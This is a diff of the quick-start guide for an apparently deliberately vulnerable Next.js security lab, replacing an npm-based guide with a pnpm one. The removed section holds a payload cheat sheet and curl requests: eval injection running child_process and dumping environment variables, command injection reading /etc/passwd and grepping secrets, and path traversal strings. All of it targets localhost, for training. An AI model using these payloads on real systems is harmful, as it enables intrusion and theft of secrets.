@@ -1,144 +1,48 @@
-# Quick Start Guide
-
-## 1. Setup (30 seconds)
+# Quick start
 
 ```bash
-cd nextjs-vulsite
-./setup.sh
+corepack enable      # once — supplies the pinned pnpm 11.25.0
+pnpm install
+pnpm dev             # main lab → http://127.0.0.1:3000
 ```
 
-Or manually:
-```bash
-npm install
-chmod +x scripts/*.sh
-```
-
-## 2. Start Server
+SCA fixture (separate terminal):
 
 ```bash
-npm run dev
+pnpm build:react2shell && pnpm start:react2shell   # → http://127.0.0.1:3001
 ```
 
-Access at: http://localhost:3000
+## Try a scenario in 60 seconds
 
-## 3. Test Vulnerabilities
+1. Open <http://127.0.0.1:3000/sql/login> — press **Load injection example**, run the **unsafe** mode (login bypassed as `admin`), then switch to **safe** (401 for the same payload).
+2. Open <http://127.0.0.1:3000/xss/unsafe/reflected> — press **Load XSS sample** and **Render payload**, then run `window.__zazzlesXss` in the browser console (it says `reflected-marker`). The same payload on `/xss/safe/reflected` is inert text.
+3. Browse <http://127.0.0.1:3000/vulnerabilities> for the full index; per-scenario exploit commands are in [`docs/vulnerabilities/`](docs/vulnerabilities/index.md).
 
-### Quick Test
+## Run the test suite
+
 ```bash
-cd scripts
-./test-all.sh
+pnpm lint             # ESLint
+pnpm test             # Vitest unit suite (real PGlite, direct handler imports)
+pnpm scenario:check   # scenario sources match the committed hash manifest
+pnpm audit:check      # pnpm audit --prod matches the committed snapshot
+
+pnpm build && pnpm start &          # then:
+pnpm test:http                      # end-to-end HTTP pairs
+pnpm exec playwright install chromium   # once
+pnpm test:browser                   # real browser execution / non-execution
+
+pnpm build:react2shell && pnpm start:react2shell &   # then:
+pnpm test:react2shell               # RSC runtime execution marker
 ```
 
-### Individual Tests
-```bash
-./test-eval-injection.sh      # Eval injection tests
-./test-form-rce.sh            # Form-based RCE
-./test-api-exploit.sh         # API exploitation
-./test-header-injection.sh    # Header injection
-./test-file-read.sh           # File read exploit
-```
+`pnpm audit --prod` exits nonzero **by design** (the vulnerable pins are the point). `audit:check` compares against the committed ground truth instead.
 
-## 4. Manual Testing
+## Reset the lab
 
-### Eval Injection
-Visit: http://localhost:3000/vulnerable/eval-injection?input='); alert('XSS'); //
-
-### Command Execution
-```bash
-curl -X POST http://localhost:3000/api/vulnerable-exec \
-  -H "Content-Type: application/json" \
-  -d '{"command": "whoami"}'
-```
-
-### Form RCE
-```bash
-curl -X POST http://localhost:3000/api/vulnerable-submit \
-  -H "Content-Type: application/json" \
-  -d '{"name": "test", "message": "'\'''); require('\''child_process'\'').exec('\''whoami'\''); //"}'
-```
-
-### File Read
-```bash
-curl -X POST http://localhost:3000/api/vulnerable-file-read \
-  -H "Content-Type: application/json" \
-  -d '{"filePath": "./package.json"}'
-```
-
-## 5. Explore Pages
-
-### Vulnerable Examples
-- http://localhost:3000/vulnerable/eval-injection
-- http://localhost:3000/vulnerable/form-submission
-- http://localhost:3000/vulnerable/api-route
-- http://localhost:3000/vulnerable/header-injection
-- http://localhost:3000/vulnerable/dynamic-import
-
-### Secure Examples
-- http://localhost:3000/secure/sanitized-input
-- http://localhost:3000/secure/validated-form
-- http://localhost:3000/secure/protected-api
-- http://localhost:3000/secure/csp-enabled
-
-## 6. Payloads Cheat Sheet
-
-### Eval Injection
-```
-'); alert('XSS'); //
-'); require('child_process').exec('whoami'); //
-'); console.log(process.env); //
-'); global.pwned = true; //
-```
-
-### Command Injection
-```
-whoami
-pwd && ls -la
-cat /etc/passwd
-env | grep -i secret
-```
-
-### Path Traversal
-```
-../../../etc/passwd
-../../package.json
-../../../../etc/hosts
-```
-
-### Form Injection
-```
-'); require('fs').readFileSync('./package.json'); //
-'); Object.keys(process.env).forEach(k => console.log(k)); //
-```
-
-## 7. Stop Server
-
-Press `Ctrl+C` in the terminal running the dev server
-
-## Troubleshooting
-
-### Port in use
-```bash
-lsof -ti:3000 | xargs kill -9
-npm run dev
-```
-
-### Dependencies error
-```bash
-rm -rf node_modules package-lock.json
-npm install
-```
-
-### Scripts not executable
-```bash
-chmod +x scripts/*.sh
-```
-
-## ⚠️ Remember
-
-- **ONLY** use in isolated environments
-- **NEVER** deploy to production
-- **ALWAYS** get authorization before testing
+`POST /api/lab/reset` (buttons on the SQL/XSS pages) re-seeds the in-memory database. Restarting the server resets it too.
 
 ---
 
-For detailed documentation, see [README.md](README.md)
+Details: [README](README.md) · [setup and testing](docs/setup-and-testing.md) · [scenario docs](docs/vulnerabilities/index.md)
+
+> ⚠️ Deliberately vulnerable — isolated local use only, synthetic data only.
